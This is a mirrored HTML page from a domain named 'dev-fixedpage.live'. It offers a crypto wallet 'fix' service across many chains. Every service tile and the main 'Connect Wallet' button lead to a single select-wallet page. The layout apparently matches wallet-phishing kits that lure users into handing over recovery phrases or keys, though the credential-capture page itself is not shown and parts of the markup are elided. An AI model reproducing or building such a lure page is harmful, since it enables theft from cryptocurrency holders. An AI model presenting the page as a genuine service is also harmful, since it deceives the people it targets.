...
<!-- Mirrored from redirect.dev-fixedpage.live/assets/fonts/fontawesome/webfonts/assets/js/jquery.min.js.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Jun 2024 08:17:10 GMT -->
<head>
    <meta charset="utf-8">
    ...
    <link href="assets/img/favicon.ico.html" rel="shortcut icon">
    <!-- Fonts -->
    <link href="assets/css/style.min.css.html" rel="stylesheet">
...
<body>
        ...
        <div class="top-header overlay item1 text-align">
            <div class="container">
                <div class="col-12 col-md-6 col-lg-12 text-center wrapper">
                    ...
                    <div class="action">
                        <a href="pages/select-wallet.html" class="btn btn-default-purple-fill me-3 mt-3">Connect Wallet</a>
                    </div>
                </div>
            </div>
        </div>

        <img class="blobleft svg d-none" src="assets/img/background/blob.svg.html" alt="Blob Background">

        <section class="sec-normal sec-grad-yellow-to-black-right bg-colorstyle bottomhalfpadding">
            <div class="faq">
                <div class="container">
                    <img class="blobright svg d-none" src="assets/img/background/blob.svg.html" alt="Blob Background">
                    <div class="row">
                    ...
                    <div class="row">
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/right-left-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/arrow-down-up-lock-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/toolbox-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/file-circle-exclamation-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/droplet-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/circle-pause-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/coins-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/satellite-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/bridge-circle-exclamation-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/user-lock-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/network-wired-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/triangle-exclamation-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/sack-dollar-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/circle-check-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/piggy-bank-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/right-to-bracket-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
                        ...
                        <div class="col-sm-12 col-md-6 col-lg-4">
                            <div class="sync-container bg-seccolorstyle noshadow">
                                <a href="pages/select-wallet.html" class="sync-item">
                                    <div class="img">
                                        <img class="svg ico" src="assets/fonts/svg/bug-solid.svg.html" height="65" alt="">
                                    </div>
                                    <div class="inform">
    ...
    <!-- ***** BUTTON GO TOP ***** -->
    <a href="index.html#0" class="cd-top"><i class="fas fa-angles-up"></i> </a>
    <!-- Javascript -->
    <script src="assets/js/jquery.min.js.html"></script>
    <script defer="" src="assets/js/bootstrap.min.js.html"></script>
    <script src="assets/js/typed.js.html"></script>
    <script defer="" src="assets/js/scripts.min.js.html"></script>
    <script>
        var typed3 = new Typed('#typed3', {
            strings: ["All Networks", "Ethereum Chain", "Binance Smart Chain", "Polygon Chain", "Avalanche Chain", "Cronos Chain", "Arbitrum Chain", "Fantom Chain"],
            typeSpeed: 50,
            backSpeed: 20,
            smartBackspace: true,
            loop: true
    ...
    <script src="code.tidio.co/dqgc4q4pqhmv1g7p9s8rolsblte8xn7r.html" async=""></script>
</body>


<!-- Mirrored from redirect.dev-fixedpage.live/assets/fonts/fontawesome/webfonts/assets/js/jquery.min.js.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Jun 2024 08:17:24 GMT -->
</html>